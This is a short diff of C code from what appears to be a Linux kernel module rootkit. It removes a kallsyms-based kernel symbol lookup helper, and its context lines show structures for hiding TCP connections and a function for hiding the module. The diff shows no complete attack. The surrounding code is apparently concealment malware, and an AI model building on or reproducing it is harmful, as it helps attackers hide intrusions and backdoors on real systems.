@@ -89,37 +89,6 @@ struct hidden_conn {
 
 LIST_HEAD(hidden_tcp_conn);
 
-struct ksym {
-	char *name;
-	unsigned long addr;
-};
-
-int find_ksym(void *data, const char *name, struct module *module, unsigned long address)
-{
-	struct ksym *ksym = (struct ksym *)data;
-	char *target = ksym->name;
-
-	if (strncmp(target, name, KSYM_NAME_LEN) == 0) {
-		ksym->addr = address;
-		return 1;
-	}
-
-	return 0;
-}
-
-unsigned long get_symbol(char *name)
-{
-	unsigned long symbol = 0;
-	struct ksym ksym;
-
-	ksym.name = name;
-	ksym.addr = 0;
-	kallsyms_on_each_symbol(&find_ksym, &ksym);
-	symbol = ksym.addr;
-
-	return symbol;
-}
-
 void hide(void)
 {
 	if (hide_module)
